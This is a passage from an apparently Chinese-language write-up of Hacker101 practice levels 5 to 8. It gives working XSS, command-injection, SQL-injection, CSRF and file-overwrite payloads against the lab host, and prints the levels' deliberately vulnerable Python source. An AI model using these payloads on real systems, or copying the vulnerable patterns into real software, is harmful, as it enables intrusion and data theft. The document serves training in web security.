<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://levels-b.hacker101.com/level5?path=/ebook<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">https://levels-b.hacker101.com/level5/read?path=/ebooks/alice.txt<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h3><p>根据源码，可以出一下请求</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://levels-b.hacker101.com/level5/post_search">https://levels-b.hacker101.com/level5/post_search</a></p>
<p>post数据：csrf=644b6355ee205742d9476a7f366a453f&amp;path=../&amp;text=niceAAA”;id;cd “</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">commands.getoutput(&#39;grep -r &quot;%s&quot; .&#39; % text)</span><br><span class="line">&#39;grep -r &quot;%s&quot; .&#39; %text</span><br><span class="line">&#39;grep -r niceAAA&quot;;id;cd .&#39;</span><br></pre></td></tr></table></figure>
<p>添加cd是为了闭合后面的点号，一遍执行任意命令。</p>
<p>在本地编写代码测试，发现需要闭合双引号。测试发现使用” 需要转译，否则会报错。测试代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">text = <span class="string">&quot;niceAAA\&quot;;ls;cd\&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;grep -r &quot;%s&quot; .&#x27;</span> % text</span><br><span class="line"><span class="built_in">print</span> commands.getoutput(<span class="string">&#x27;grep -r &quot;%s&quot; .&#x27;</span> % text)</span><br></pre></td></tr></table></figure>
<p>但是直接使用<code>niceAAA\&quot;;ls;cd\&quot;</code> 无效, 猜测是编码问题。url编码等尝试未果后，删除了转译符号，测试通过。</p>
<p><img src="./1519800662072.png" alt="1519800662072"></p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> commands, os</span><br><span class="line"><span class="keyword">from</span> handler <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> glob <span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> isfile, isdir</span><br><span class="line"></span><br><span class="line"><span class="meta">@handler(<span class="params"><span class="string">&#x27;level5/index&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index</span>(<span class="params">path=<span class="string">&#x27;/&#x27;</span></span>):</span></span><br><span class="line">true<span class="keyword">if</span> <span class="keyword">not</span> isdir(<span class="string">&#x27;level5_docs/&#x27;</span> + path):</span><br><span class="line">truetrue<span class="keyword">return</span> <span class="string">&#x27;No such directory: &#x27;</span> + path</span><br><span class="line"></span><br><span class="line">true<span class="keyword">if</span> <span class="keyword">not</span> path.endswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">truetruepath += <span class="string">&#x27;/&#x27;</span></span><br><span class="line">truedirs = []</span><br><span class="line">truefiles = []</span><br><span class="line">true<span class="keyword">for</span> fn <span class="keyword">in</span> glob(<span class="string">&#x27;level5_docs/&#x27;</span> + path + <span class="string">&#x27;*&#x27;</span>):</span><br><span class="line">truetrue<span class="keyword">if</span> isdir(fn):</span><br><span class="line">truetruetruedirs.append(fn.rsplit(<span class="string">&#x27;/&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>])</span><br><span class="line">truetrue<span class="keyword">else</span>:</span><br><span class="line">truetruetruefiles.append(fn.rsplit(<span class="string">&#x27;/&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">true<span class="keyword">return</span> <span class="built_in">dict</span>(path=path, dirs=dirs, files=files)</span><br><span class="line"></span><br><span class="line"><span class="meta">@handler</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_read</span>(<span class="params">path</span>):</span></span><br><span class="line">truepath = path.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">true<span class="keyword">try</span>:</span><br><span class="line">truetrue<span class="keyword">return</span> Response(file(<span class="string">&#x27;level5_docs/&#x27;</span> + path).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">true<span class="keyword">except</span>:</span><br><span class="line">truetrue<span class="keyword">return</span> <span class="string">&#x27;No such file: &#x27;</span> + path</span><br><span class="line"></span><br><span class="line"><span class="meta">@handler</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post_search</span>(<span class="params">path, text</span>):</span></span><br><span class="line">trueold = os.getcwd()</span><br><span class="line">true<span class="keyword">try</span>:</span><br><span class="line">truetrueos.chdir(<span class="string">&#x27;level5_docs/&#x27;</span> + path)</span><br><span class="line">truetrueout = commands.getoutput(<span class="string">&#x27;grep -r &quot;%s&quot; .&#x27;</span> % text)</span><br><span class="line">true<span class="keyword">finally</span>:</span><br><span class="line">truetrueos.chdir(old)</span><br><span class="line">true<span class="keyword">return</span> out.replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&lt;br&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p><img src="./1519805366516.png" alt="1519805366516"></p>
<h3 id="Reflected-Stored-XSS"><a href="#Reflected-Stored-XSS" class="headerlink" title="Reflected/Stored XSS"></a>Reflected/Stored XSS</h3><h4 id="Reflected-XSS-2"><a href="#Reflected-XSS-2" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;levels-b.hacker101.com&#x2F;level6?filter&#x3D;&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="./1519805957215.png" alt="1519805957215"></p>
<h4 id="Stored-XSS-1"><a href="#Stored-XSS-1" class="headerlink" title="Stored XSS"></a>Stored XSS</h4><p>主页显示的时候，特殊字符做了转译，但在编译页面没有做转译。first name做了转译，last name没有做转译。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Doe<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&gt;&lt;img src=1 onerror=alert(&quot;</span><span class="attr">xss</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="./1519805239531.png" alt="1519805239531"></p>
<h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>sqlmap跑出来的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;levels-b.hacker101.com&#x2F;level6?filter&#x3D;j&#39;) UNION SELECT DISTINCT database(),version(),user() --+</span><br></pre></td></tr></table></figure>
<p><img src="./1519913511837.png" alt="1519913511837"></p>
<p>查看源码，发现需要首先使用 <code>&#39;)</code> 闭合前面的部分，然后执行union查询，最后注释掉后面的查询。起初尝试了各种闭合的手段，但唯独不知道要用有括号的存在。逆向推测发现，当时用该这样理解。由于是模糊查询 且 firstname 和 lastname 匹配一个即可，应当想到次查询并列，可能会用括号将这两个条件包括在一起。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict(filter&#x3D;filter, students&#x3D;db.query(&quot;SELECT id, lastname, firstname FROM students WHERE sessid&#x3D;&#39;%s&#39; AND (firstname LIKE &#39;%%%%%s%%%%&#39; OR lastname LIKE &#39;%%%%%s%%%%&#39;);&quot; % (handler.sessid(), filter, filter)))</span><br></pre></td></tr></table></figure>
<h3 id="CSRF-2"><a href="#CSRF-2" class="headerlink" title="CSRF"></a>CSRF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不同账号获取到的csrf token</span><br><span class="line">644b6355ee205742d9476a7f366a453f</span><br><span class="line">a355c867f8e3b7d5c9cf1bc596e0145b</span><br></pre></td></tr></table></figure>
<p>本想使用反射性 XSS 获取cookie，但设置了HttpOnly。这条路行不行。</p>
<p>正好在 Edit 页面同时有csrf token 和 存储型 XSS ，两者结合起来可以获取到csrf token。但是怎么触发？必须知道csrf token才能触发存储型 XSS，也就是说拿不到别人的token。故此方法也不可行。</p>
<p>后发现直接向<a target="_blank" rel="noopener" href="https://levels-b.hacker101.com/level6/post_add">https://levels-b.hacker101.com/level6/post_add</a> 提交数据，不带 csrf token 可以添加成功。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Test CSRF <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf-frame&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://levels-b.hacker101.com/level6/post_add&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">id</span>=<span class="string">&quot;csrf-form&quot;</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;firstname&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;first&#x27;</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lastname&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;last&#x27;</span>&gt;</span></span><br><span class="line">truetrue<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">true<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Auto submit the form when page loads --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">&quot;csrf-form&quot;</span>).submit()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@handler(<span class="params">CSRFable=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post_add</span>(<span class="params">firstname, lastname</span>):</span></span><br><span class="line">truedb.query(<span class="string">&quot;INSERT INTO `students` (firstname, lastname, sessid) VALUES (&#x27;%s&#x27;, &#x27;%s&#x27;, &#x27;%s&#x27;);&quot;</span> % (firstname, lastname, handler.sessid()))</span><br><span class="line"></span><br><span class="line">trueredirect(get_index)</span><br></pre></td></tr></table></figure>
<ul>
<li>不提交csrf token。</li>
<li>提交任意csrf token。</li>
</ul>
<ul>
<li>猜测 csrf token 的构造。</li>
<li>是不是只校验了长度。</li>
<li>可不可以用另一个账号获取的代替，即token 和账户没有绑定，只要token有效即可。</li>
<li>使用 XSS 获取 token。</li>
</ul>
<h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> handler <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="meta">@handler(<span class="params"><span class="string">&#x27;level6/index&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index</span>(<span class="params"><span class="built_in">filter</span>=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">true<span class="keyword">if</span> db.query(<span class="string">&#x27;SELECT COUNT(id) FROM students WHERE sessid=%s;&#x27;</span>, handler.sessid())[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">truetrue<span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">firstname, lastname</span>):</span></span><br><span class="line">truetruetruedb.query(<span class="string">&#x27;INSERT INTO `students` (firstname, lastname, sessid) VALUES (%s, %s, %s);&#x27;</span>, firstname, lastname, handler.sessid())</span><br><span class="line"></span><br><span class="line">truetrueadd(<span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;Doe&#x27;</span>)</span><br><span class="line">truetrueadd(<span class="string">&#x27;Cody&#x27;</span>, <span class="string">&#x27;Brocious&#x27;</span>)</span><br><span class="line">truetrueadd(<span class="string">&#x27;Testy&#x27;</span>, <span class="string">&#x27;McTesterson&#x27;</span>)</span><br><span class="line"></span><br><span class="line">true<span class="built_in">print</span> <span class="built_in">filter</span></span><br><span class="line">true<span class="keyword">return</span> <span class="built_in">dict</span>(<span class="built_in">filter</span>=<span class="built_in">filter</span>, students=db.query(<span class="string">&quot;SELECT id, lastname, firstname FROM students WHERE sessid=&#x27;%s&#x27; AND (firstname LIKE &#x27;%%%%%s%%%%&#x27; OR lastname LIKE &#x27;%%%%%s%%%%&#x27;);&quot;</span> % (handler.sessid(), <span class="built_in">filter</span>, <span class="built_in">filter</span>)))</span><br><span class="line"></span><br><span class="line"><span class="meta">@handler(<span class="params"><span class="string">&#x27;level6/edit&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_edit</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">true<span class="keyword">return</span> <span class="built_in">dict</span>(student=db.query(<span class="string">&quot;SELECT id, lastname, firstname FROM students WHERE id=&#x27;%s&#x27;;&quot;</span> % <span class="built_in">id</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="meta">@handler</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post_edit</span>(<span class="params"><span class="built_in">id</span>, firstname, lastname</span>):</span></span><br><span class="line">truestudent = db.query(<span class="string">&#x27;SELECT sessid FROM students where id=%s&#x27;</span>, <span class="built_in">id</span>)</span><br><span class="line">true<span class="keyword">if</span> student[<span class="number">0</span>][<span class="number">0</span>] != handler.sessid():</span><br><span class="line">truetrue<span class="keyword">return</span> <span class="string">&#x27;Student does not belong to your account.&#x27;</span></span><br><span class="line"></span><br><span class="line">truedb.query(<span class="string">&#x27;UPDATE students SET lastname=%s, firstname=%s WHERE id=%s&#x27;</span>, lastname, firstname, <span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line">trueredirect(get_index)</span><br><span class="line"></span><br><span class="line"><span class="meta">@handler(<span class="params"><span class="string">&#x27;level6/add&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_add</span>():</span></span><br><span class="line">true<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@handler(<span class="params">CSRFable=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post_add</span>(<span class="params">firstname, lastname</span>):</span></span><br><span class="line">truedb.query(<span class="string">&quot;INSERT INTO `students` (firstname, lastname, sessid) VALUES (&#x27;%s&#x27;, &#x27;%s&#x27;, &#x27;%s&#x27;);&quot;</span> % (firstname, lastname, handler.sessid()))</span><br><span class="line"></span><br><span class="line">trueredirect(get_index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> db.hastable(<span class="string">&#x27;students&#x27;</span>):</span><br><span class="line">truedb.maketable(<span class="string">&#x27;students&#x27;</span>, </span><br><span class="line">truetruelastname=<span class="string">&#x27;VARCHAR(1024)&#x27;</span>, </span><br><span class="line">truetruefirstname=<span class="string">&#x27;VARCHAR(1024)&#x27;</span>, </span><br><span class="line">truetruesessid=<span class="string">&#x27;CHAR(16)&#x27;</span></span><br><span class="line">true)</span><br></pre></td></tr></table></figure>
<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p><img src="./1519959728275.png" alt="1519959728275"></p>
<p>###XSS</p>
<p>登录错误提示页面存在 XSS 漏洞，username 特殊符号经过了转译，而 password 没有。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;levels-b.hacker101.com&#x2F;level7?error&#x3D;User+does+not+exist&amp;username&#x3D;admin&amp;password&#x3D;admin&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h3 id="SQL-Injection-1"><a href="#SQL-Injection-1" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csrf&#x3D;9c1debdb7dcc0f6a1c67bd4f20454a1b&amp;username&#x3D;admin&#39; or 1 ’# &amp;password&#x3D;</span><br></pre></td></tr></table></figure>
<p>得到报错信息，user = db.query(“SELECT password FROM users WHERE username=’%s’” % username)<br><img src="./1519954198293.png" alt="1519954198293"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csrf&#x3D;9c1debdb7dcc0f6a1c67bd4f20454a1b&amp;username&#x3D;admin&#39; or 1#&amp;password&#x3D;</span><br></pre></td></tr></table></figure>
<p>先前一直在再试万能密码，但是仍旧提示用户不存在，即查询到的结果为空。猜测表中没有数据。</p>
<p><img src="./1519957352419.png" alt="1519957352419"></p>
<p>后使用union查询，实现注入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">csrf&#x3D;9c1debdb7dcc0f6a1c67bd4f20454a1b&amp;username&#x3D;admin&#39; order by 1#&amp;password&#x3D;</span><br><span class="line">csrf&#x3D;9c1debdb7dcc0f6a1c67bd4f20454a1b&amp;username&#x3D;admin&#39;union select 1 #&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>
<p><img src="./1519957176364.png" alt="1519957176364"></p>
<p>此题是根据用户名在数据库中查询密码，然后与提交的密码来判断是否一致。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> handler <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="meta">@handler(<span class="params"><span class="string">&#x27;level7/index&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index</span>(<span class="params">error=<span class="literal">None</span>, username=<span class="string">&#x27;admin&#x27;</span>, password=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">true<span class="keyword">return</span> <span class="built_in">dict</span>(error=error, username=username, password=password)</span><br><span class="line"></span><br><span class="line"><span class="meta">@handler</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post_index</span>(<span class="params">username, password</span>):</span></span><br><span class="line">true<span class="keyword">try</span>:</span><br><span class="line">truetrueuser = db.query(<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;%s&#x27;&quot;</span> % username)</span><br><span class="line">true<span class="keyword">except</span> Exception, e:</span><br><span class="line">truetrue<span class="keyword">import</span> traceback</span><br><span class="line">truetrue<span class="keyword">return</span> Response(traceback.format_exc() + <span class="string">&#x27;\n&#x27;</span> + e[<span class="number">1</span>], mimetype=<span class="string">&#x27;text/plain&#x27;</span>)】</span><br><span class="line"></span><br><span class="line">true<span class="keyword">if</span> <span class="built_in">len</span>(user) == <span class="number">0</span>:</span><br><span class="line">truetrueredirect(get_index.url(error=<span class="string">&#x27;User does not exist&#x27;</span>, username=username, password=password))</span><br><span class="line">true<span class="keyword">elif</span> user[<span class="number">0</span>][<span class="number">0</span>] == password:</span><br><span class="line">truetrueredirect(get_success.url(username=username))</span><br><span class="line">true<span class="keyword">else</span>:</span><br><span class="line">truetrueredirect(get_index.url(error=<span class="string">&#x27;Invalid password&#x27;</span>, username=username, password=password))</span><br><span class="line"></span><br><span class="line"><span class="meta">@handler(<span class="params"><span class="string">&#x27;level7/success&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_success</span>(<span class="params">username</span>):</span></span><br><span class="line">true<span class="keyword">return</span> <span class="built_in">dict</span>(username=username)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> db.hastable(<span class="string">&#x27;users&#x27;</span>):</span><br><span class="line">truedb.maketable(<span class="string">&#x27;users&#x27;</span>, </span><br><span class="line">truetrueusername=<span class="string">&#x27;VARCHAR(1024)&#x27;</span>, </span><br><span class="line">truetruepassword=<span class="string">&#x27;VARCHAR(1024)&#x27;</span></span><br><span class="line">true)</span><br></pre></td></tr></table></figure>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p><img src="./1519959691722.png" alt="1519959691722"></p>
<p>上传 html 文件，预览时直接进入了下载。比对发现多了Content-Disposition 属性，它是作为对下载文件的一个标识字段。</p>
<h3 id="XSS-2"><a href="#XSS-2" class="headerlink" title="XSS"></a>XSS</h3><p>上传任意文件（如png），burpsuite 代理修改 MIME-type <code>Content-Type: image/png</code>为<code>Content-Type: &lt;/td&gt;&lt;script&gt;alert(1)&lt;/script&gt;onmouseover=alert(1)&gt;&lt;td&gt;</code></p>
<p> 一直以为要通过上传绕过实现 XSS ，让上传的文件得以解析为HTML，最终在浏览器执行。回过头来想一想，这应该是文件上传漏洞，而不是 XSS 漏洞。</p>
<p>参考 <a target="_blank" rel="noopener" href="https://octfive.cn/299">https://octfive.cn/299</a></p>
<h3 id="Directory-Traversal-1"><a href="#Directory-Traversal-1" class="headerlink" title="Directory Traversal"></a>Directory Traversal</h3><p>不能读取任意文件，但是能够覆盖任意文件</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/level8/post_index</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>levels-b.hacker101.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://levels-b.hacker101.com/level8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>__cfduid=d479a6128517cfcbef11858640e05c57b1517904353; _ga=GA1.2.410155586.1517904356; _gid=GA1.2.518095736.1522759101; session=.eJyrVkouLkpTsqpWUkhSslKKCnGsinIJLfd1Sa-Kyg018HWJNPUNSTb2dXHK9g8JNIoM96yKykrJ8g0JtFWq1VEqTi0uzkxBaM_1rPIP98r1d_EsBxpjElkVWRWVbgtUWgsA25Mhkw.DaUJVg.ABSSPJf2ADHFWCup3ZSJpD27AzI</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------2062164199649</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>439</span><br><span class="line"></span><br><span class="line">-----------------------------2062164199649</span><br><span class="line">Content-Disposition: form-data; name=&quot;csrf&quot;</span><br><span class="line"></span><br><span class="line">e03d50083fe406917700d946ab3f7c14</span><br><span class="line">-----------------------------2062164199649</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">aaaa</span><br><span class="line">-----------------------------2062164199649</span><br><span class="line">Content-Disposition: form-data; name=&quot;doc&quot;; filename=&quot;../handler.py&quot;</span><br><span class="line">Content-Type: 